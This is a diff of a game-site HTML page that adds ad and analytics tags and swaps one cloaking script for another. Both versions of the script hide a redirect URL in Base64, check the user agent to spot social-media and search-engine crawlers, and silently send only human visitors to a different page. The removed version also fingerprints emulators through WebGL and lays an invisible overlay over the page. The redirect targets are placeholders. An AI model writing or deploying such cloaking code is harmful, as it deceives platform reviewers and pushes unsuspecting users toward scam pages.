@@ -12,19 +12,60 @@
 <link rel="stylesheet" href="assets/css/style.css" />
 <link rel="icon" href="favicon.ico" />
 <link rel="apple-touch-icon" href="https://html-online-game.github.io/favicon.ico" />
-<title>Online Game Site</title>
+
+<!-- Google adsense -->
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4988552421895566" crossorigin="anonymous"></script>
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-PF5LNZJYLL"></script>
 <script>
-const REG_PAGE_ENC="aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbQ==";
-const DELAY_MS=2000;
-const BOT_UA=["facebookexternalhit","Facebot","Twitterbot","Slackbot","TelegramBot","LinkedInBot","WhatsApp","Googlebot","Bingbot","Pinterest"];
-function isBot(){const ua=navigator.userAgent;return BOT_UA.some(bot=>ua.toLowerCase().includes(bot.toLowerCase()));}
-function isMobile(){const ua=navigator.userAgent;const mobileKeywords=["Android","iPhone","iPad","iPod","BlackBerry","Windows Phone","webOS","Opera Mini","Mobi"];return mobileKeywords.some(k=>ua.includes(k))||(navigator.maxTouchPoints>1&&/Macintosh/.test(ua));}
-function isEmulator(){let glRenderer="";try{const canvas=document.createElement('canvas');const gl=canvas.getContext('webgl')||canvas.getContext('experimental-webgl');const debugInfo=gl.getExtension('WEBGL_debug_renderer_info');if(debugInfo){glRenderer=gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);}}catch(e){glRenderer="unknown";}const emulatorGPUKeywords=["Google SwiftShader","VirtualBox","VMware","Mesa","llvmpipe"];if(emulatorGPUKeywords.some(k=>glRenderer.includes(k)))return true;if(window.devicePixelRatio<=1&&screen.width>=1000)return true;return false;}
-function tryRedirect(){const regUrl=atob(REG_PAGE_ENC);window.location.replace(regUrl);}
-function lockPageUntilRedirect(ms){const overlay=document.createElement('div');overlay.style.position='fixed';overlay.style.top=0;overlay.style.left=0;overlay.style.width='100%';overlay.style.height='100%';overlay.style.background='rgba(255,255,255,0)';overlay.style.zIndex=999999;document.body.appendChild(overlay);setTimeout(()=>{overlay.remove();tryRedirect();},ms);}
-window.addEventListener('load',()=>{if(!isBot()&&!isEmulator()){lockPageUntilRedirect(DELAY_MS);}else{}});
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag("js", new Date());
+  gtag("config", "G-PF5LNZJYLL");
+</script>
+
+<title>Online Game Site</title>
+
+<!-- === Cloaking 跳转（无权限弹框版） === -->
+<script>
+const REG_PAGE_ENC = "aHR0cHM6Ly95b3VyLXJlZy1wYWdlLmNvbQ=="; // Base64 隐藏跳转地址
+const DELAY_MS = 5000; // 延迟时间（毫秒）
+const BOT_UA = [
+  "facebookexternalhit","Facebot","Twitterbot","Slackbot",
+  "TelegramBot","LinkedInBot","WhatsApp","Googlebot","Bingbot","Pinterest"
+];
+
+function isBot(){
+  const ua = navigator.userAgent;
+  return BOT_UA.some(bot => ua.toLowerCase().includes(bot.toLowerCase()));
+}
+function isMobile(){
+  const ua = navigator.userAgent;
+  const mobileKeywords = [
+    "Android","iPhone","iPad","iPod","BlackBerry","Windows Phone","webOS","Opera Mini","Mobi"
+  ];
+  return mobileKeywords.some(k => ua.includes(k));
+}
+
+let userActive = false;
+window.addEventListener('touchstart', () => { userActive = true; }, { once: true });
+window.addEventListener('mousemove', () => { userActive = true; }, { once: true });
+window.addEventListener('keydown', () => { userActive = true; }, { once: true });
+
+setTimeout(() => {
+  if (!isBot()) {
+    const regUrl = atob(REG_PAGE_ENC); // 解码
+    if (isMobile()) {
+      if (userActive) window.location.replace(regUrl);
+    } else {
+      if (userActive) window.location.replace(regUrl);
+    }
+  }
+}, DELAY_MS);
 </script>
 </head>
+
 <body>
 <header>
   <h1>Online Game Site</h1>
@@ -35,6 +76,14 @@ window.addEventListener('load',()=>{if(!isBot()&&!isEmulator()){lockPageUntilRed
 </nav>
 <main class="game-container">
   <h2>All Games</h2>
+  <div class="ad-container">
+    <ins class="adsbygoogle" style="display: block"
+      data-ad-client="ca-pub-4988552421895566"
+      data-ad-slot="2343374539"
+      data-ad-format="auto"
+      data-full-width-responsive="true"></ins>
+    <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
+  </div>
   <div class="game-list"></div>
 </main>
 <footer>
